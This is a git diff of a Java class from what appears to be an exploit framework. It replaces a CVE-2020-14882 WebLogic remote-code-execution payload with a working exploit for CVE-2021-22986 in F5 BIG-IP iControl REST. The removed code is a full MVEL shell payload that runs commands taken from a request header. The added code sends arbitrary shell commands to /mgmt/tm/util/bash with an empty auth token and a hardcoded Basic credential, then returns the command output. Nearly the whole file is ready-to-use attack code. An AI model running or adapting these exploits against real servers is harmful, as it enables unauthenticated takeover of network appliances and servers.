@@ -2,46 +2,49 @@ package com.yhy.core;
 
 import com.yhy.tools.HttpTool;
 import com.yhy.tools.Tools;
+import org.json.JSONObject;
 
 import java.util.HashMap;
 import java.util.UUID;
 
 /**
  * @author yhy
- * @date 2021/3/25 22:49
+ * @date 2021/4/3 23:20
  * @github https://github.com/yhy0
- * 编写EXP 示例文件
+ *
+ *  CVE-2021-22986 F5 BIG-IP/BIG-IQ iControl REST 未授权远程代码执行漏洞
+ *  未经身份验证的攻击者可通过iControl REST接口，构造恶意请求，执行任意系统命令。
  */
 
-public class CVE_2020_14882 implements ExploitInterface{
+
+public class CVE_2021_22986 implements ExploitInterface{
+
     private String target = null;
     private boolean isVul = false;
 
-    private static final String VULURL = "/console/css/%252e%252e%252fconsole.portal";
-    private static final String PAYLOAD = ("_nfpb=true&_pageLabel=&handle=com.tangosol.coherence.mvel2.sh.ShellSession(\"weblogic.work.ExecuteThread executeThread = (weblogic.work.ExecuteThread) Thread.currentThread(); weblogic.work.WorkAdapter adapter = executeThread.getCurrentWork(); java.lang.reflect.Field field = adapter.getClass().getDeclaredField(\"connectionHandler\"); field.setAccessible(true); Object obj = field.get(adapter); weblogic.servlet.internal.ServletRequestImpl req = (weblogic.servlet.internal.ServletRequestImpl) obj.getClass().getMethod(\"getServletRequest\").invoke(obj); String cmd = req.getHeader(\"cmd\"); String[] cmds = System.getProperty(\"os.name\").toLowerCase().contains(\"window\") ? new String[]{\"cmd.exe\", \"/c\", cmd} : new String[]{\"/bin/sh\", \"-c\", cmd}; if (cmd != null) { String result = new java.util.Scanner(java.lang.Runtime.getRuntime().exec(cmds).getInputStream()).useDelimiter(\"\\\\A\").next(); weblogic.servlet.internal.ServletResponseImpl res = (weblogic.servlet.internal.ServletResponseImpl) req.getClass().getMethod(\"getResponse\").invoke(req);res.getServletOutputStream().writeStream(new weblogic.xml.util.StringInputStream(result));res.getServletOutputStream().flush(); res.getWriter().write(\"\"); }executeThread.interrupt(); \");");
+    private static final String VULURL = "/mgmt/tm/util/bash";
+    private static final String PAYLOAD = "{\"command\":\"run\",\"utilCmdArgs\":\"-c whoami\"}";
 
-
-    public CVE_2020_14882() {
+    public CVE_2021_22986() {
 
     }
 
     public boolean checkVUL(String url) throws Exception {
         this.target = url;
+
+
         String uuid =  UUID.randomUUID().toString();
         String path = url + VULURL;
         try {
 
             HashMap<String, String> map = new HashMap();       //请求headers
             // 设置 header ，执行命令
-            map.put("cmd", "echo " + uuid);
+            map.put("X-F5-Auth-Token", "");
+            map.put("Authorization", "Basic YWRtaW46QVNhc1M=");
 
-            String result = HttpTool.postHttpReuest(path, PAYLOAD, "UTF-8", map, "application/x-www-form-urlencoded");
+            String result = HttpTool.postHttpReuest(path, PAYLOAD, "UTF-8", map, "application/json");
 
-            System.out.println("result ");
-            System.out.println(result);
-
-            boolean flag = result.contains(uuid);
-
+            boolean flag = result.contains("commandResult");
             if(flag) {
                 this.isVul = true;
             }
@@ -59,10 +62,18 @@ public class CVE_2020_14882 implements ExploitInterface{
         String path = this.target + VULURL;
         try {
             HashMap<String, String> map = new HashMap();       //请求headers
+
             // 设置 header ，执行命令
-            map.put("cmd", cmd);
-            System.out.println(cmd);
-            String result = HttpTool.postHttpReuest(path, PAYLOAD, encoding, map, "application/x-www-form-urlencoded");
+            map.put("X-F5-Auth-Token", "");
+            map.put("Authorization", "Basic YWRtaW46QVNhc1M=");
+
+
+            String payload = String.format("{\"command\":\"run\",\"utilCmdArgs\":\"-c %s\"}", cmd);
+            String result = HttpTool.postHttpReuest(path, payload, encoding, map, "application/json");
+
+            JSONObject jsonObj = new JSONObject(result);
+            result = jsonObj.getString("commandResult");
+
 
             return result + "\r\n 命令执行成功";
 
@@ -73,6 +84,7 @@ public class CVE_2020_14882 implements ExploitInterface{
 
     }
 
+    // 上传文件这里并没有实现
     public String uploadFile(String fileContent, String filename, String platform) throws Exception {
 
         // 因为使用echo 写 shell ，这里需要对 < > 转义
@@ -106,4 +118,5 @@ public class CVE_2020_14882 implements ExploitInterface{
     public boolean isVul() {
         return this.isVul;
     }
+
 }
